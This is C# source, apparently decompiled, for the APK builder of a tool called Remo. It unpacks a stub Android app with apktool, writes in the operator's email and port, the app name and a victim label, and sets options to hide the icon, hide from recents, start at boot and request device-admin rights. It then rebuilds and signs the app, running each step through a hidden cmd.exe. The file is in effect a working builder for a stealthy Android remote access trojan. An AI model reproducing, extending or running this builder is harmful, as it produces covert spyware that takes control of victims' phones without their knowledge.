using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Xml;

namespace Remo
{
	internal class Builder
	{
		private static string BTempPath = Path.GetTempPath() + "RemoBuild";

		private MainForm f;

		private Thread thread;

		private string AppName;

		private string SAVEAPKPATH;

		private static bool Decompiled = false;

		private static bool Edited = false;

		private static bool recompiled = false;

		private static bool Signed = false;

		private string VName;

		private string Email;

		private string Port;

		private string BindPath;

		private bool HideIcon;

		private bool recent;

		private bool startup;

		private bool bind;

		private bool DeviceAdmin;

		private StringBuilder SB;

		private string Zero = Environment.CurrentDirectory + "\\B\\0.apk";

		private string one = Builder.BTempPath + "\\1";

		private string Two = Builder.BTempPath + "\\2.apk";

		private string Three = Builder.BTempPath + "\\3.apk";

		private int count;

		public Builder(MainForm f, string SAVEAPKPATH, string AppName, string VName, string Email, string Port, string BindPath, bool HideIcon, bool recent, bool startup, bool bind, bool DeviceAdmin)
		{
			Console.WriteLine("BTPATH" + Builder.BTempPath);
			this.SAVEAPKPATH = SAVEAPKPATH;
			this.AppName = AppName;
			this.VName = VName;
			this.Email = Email;
			this.Port = Port;
			this.BindPath = BindPath;
			this.HideIcon = HideIcon;
			this.recent = recent;
			this.startup = startup;
			this.bind = bind;
			this.f = f;
			this.DeviceAdmin = DeviceAdmin;
			if (Directory.Exists(Builder.BTempPath))
			{
				Directory.Delete(Builder.BTempPath, true);
			}
			int num = 0;
			while (num < 10 && Directory.Exists(Builder.BTempPath))
			{
				Thread.Sleep(1000);
				num++;
			}
			Directory.CreateDirectory(Builder.BTempPath);
		}

		public void prepare()
		{
			Builder.Decompiled = false;
			Builder.Edited = false;
			Builder.recompiled = false;
			Builder.Signed = false;
			try
			{
				if (Directory.Exists(this.one + "\\"))
				{
					Directory.Delete(this.one + "\\", true);
				}
				if (File.Exists(this.one))
				{
					File.Delete(this.one);
				}
				if (File.Exists(this.Two))
				{
					File.Delete(this.Two);
				}
				if (File.Exists(this.Three))
				{
					File.Delete(this.Three);
				}
				this.f.txtBconsole.Clear();
				this.thread = null;
				this.thread = new Thread(delegate ()
                {
					this.Build();
				});
				this.thread.Start();
			}
			catch
			{
			}
		}

		public void Build()
		{
			this.SB = new StringBuilder();
			string cmd = string.Concat(new string[]
			{
				"/C java -jar \"",
				Environment.CurrentDirectory,
				"\\B\\apktool.jar\" d \"",
				this.Zero,
				"\" -f -o \"",
				this.one,
				"\""
			});
			this.proc(cmd);
			int num = 0;
			while (num < 10 && !Builder.Decompiled)
			{
				Thread.Sleep(1000);
				num++;
			}
			if (!this.bind)
			{
				this.editxml();
			}
			Console.WriteLine("rebuilding");
			cmd = string.Concat(new string[]
			{
				"/C java -jar \"",
				Environment.CurrentDirectory,
				"\\B\\apktool.jar\" b \"",
				this.one,
				"\" -o \"",
				this.Two,
				"\""
			});
			int num2 = 0;
			while (num2 < 10 && !Builder.Edited)
			{
				Thread.Sleep(1000);
				num2++;
			}
			this.proc(cmd);
			for (int i = 0; i < 10; i++)
			{
				if (!File.Exists(this.Two))
				{
					Thread.Sleep(1000);
				}
			}
			int num3 = 0;
			while (num3 < 10 && !Builder.recompiled)
			{
				Thread.Sleep(1000);
				num3++;
			}
			Console.WriteLine("Signing");
			cmd = string.Concat(new string[]
			{
				"/C java -jar \"",
				Environment.CurrentDirectory,
				"\\B\\signapk.jar\" \"",
				Environment.CurrentDirectory,
				"\\B\\certificate.pem\" \"",
				Environment.CurrentDirectory,
				"\\B\\key.pk8\" \"",
				this.Two,
				"\" \"",
				this.Three,
				"\""
			});
			this.proc(cmd);
			int num4 = 0;
			while (num4 < 10 && !Builder.Signed)
			{
				Thread.Sleep(1000);
				num4++;
			}
			int j = 0;
			while (j < 10)
			{
				try
				{
					File.Copy(this.Three, this.SAVEAPKPATH, true);
					Thread.Sleep(2000);
					this.f.FinishBConsole(true);
					break;
				}
				catch
				{
					Thread.Sleep(500);
					if (j < 9)
					{
						goto IL_22C;
					}
				}
				goto IL_220;
				IL_22C:
				j++;
				continue;
				IL_220:
				this.f.FinishBConsole(false);
				goto IL_22C;
			}
		}

		private void proc(string cmd)
		{
			Process arg_32_0 = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.CreateNoWindow = true;
			arg_32_0.EnableRaisingEvents = true;
			processStartInfo.Arguments = cmd;
			Console.WriteLine(processStartInfo.Arguments);
			arg_32_0.StartInfo = processStartInfo;
			arg_32_0.OutputDataReceived += new DataReceivedEventHandler(this.Process_OutputDataReceived);
			arg_32_0.Exited += new EventHandler(this.Process_Exited);
			arg_32_0.Start();
			arg_32_0.BeginOutputReadLine();
		}

		private void Process_Exited(object sender, EventArgs e)
		{
			if (this.count == 0)
			{
				Builder.Decompiled = true;
			}
			else if (this.count == 1)
			{
				Builder.recompiled = true;
			}
			else if (this.count == 2)
			{
				Builder.Signed = true;
			}
			this.count++;
		}

		private void Process_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			try
			{
				if (!e.Data.StartsWith("I: Using Apktool") && !e.Data.StartsWith("I: Loading resource"))
				{
					if (e.Data.Contains("unknown"))
					{
						this.SB.Append(e.Data.Replace("unknown", "") + Environment.NewLine);
						this.f.UpdateBConsole(this.SB.ToString());
					}
					else
					{
						this.SB.Append(e.Data + Environment.NewLine);
						this.f.UpdateBConsole(this.SB.ToString());
					}
				}
			}
			catch (Exception arg_B3_0)
			{
				Console.WriteLine(arg_B3_0.Message);
			}
		}

		private void editxml()
		{
			string text = "";
			XmlDocument xmlDocument = new XmlDocument();
			text = Builder.BTempPath + "\\1\\res\\values\\strings.xml";
			Console.WriteLine("Strings path " + text);
			for (int i = 0; i < 10; i++)
			{
				try
				{
					xmlDocument.Load(text);
					break;
				}
				catch
				{
					Thread.Sleep(500);
				}
			}
			foreach (XmlNode xmlNode in xmlDocument.SelectNodes("/resources/string"))
			{
				XmlAttribute xmlAttribute = xmlNode.Attributes["name"];
				if (xmlAttribute != null)
				{
					string value = xmlAttribute.Value;
					if (value.Equals("Email"))
					{
						xmlNode.InnerText = this.Email;
					}
					if (value.Equals("Recents"))
					{
						if (this.recent)
						{
							xmlNode.InnerText = "true";
						}
						else
						{
							xmlNode.InnerText = "false";
						}
					}
					else if (value.Equals("Port"))
					{
						xmlNode.InnerText = this.Port;
					}
					else if (value.Equals("app_name"))
					{
						xmlNode.InnerText = this.AppName;
					}
					else if (value.Equals("PersonName"))
					{
						int num = new Random().Next(10001, 100000);
						xmlNode.InnerText = this.VName + "_" + num;
					}
					else if (value.Equals("Startup"))
					{
						if (this.startup)
						{
							xmlNode.InnerText = "1";
						}
						else
						{
							xmlNode.InnerText = "0";
						}
					}
					else if (value.Equals("HideIcon"))
					{
						if (this.HideIcon)
						{
							xmlNode.InnerText = "1";
						}
						else
						{
							xmlNode.InnerText = "0";
						}
					}
					else if (value.Equals("DeviceAdmin"))
					{
						if (this.DeviceAdmin)
						{
							xmlNode.InnerText = "1";
						}
						else
						{
							xmlNode.InnerText = "0";
						}
					}
					Console.WriteLine(xmlNode.InnerText);
				}
			}
			Thread.Sleep(1000);
			try
			{
				xmlDocument.Save(text);
			}
			catch
			{
			}
			Builder.Edited = true;
		}
	}
}
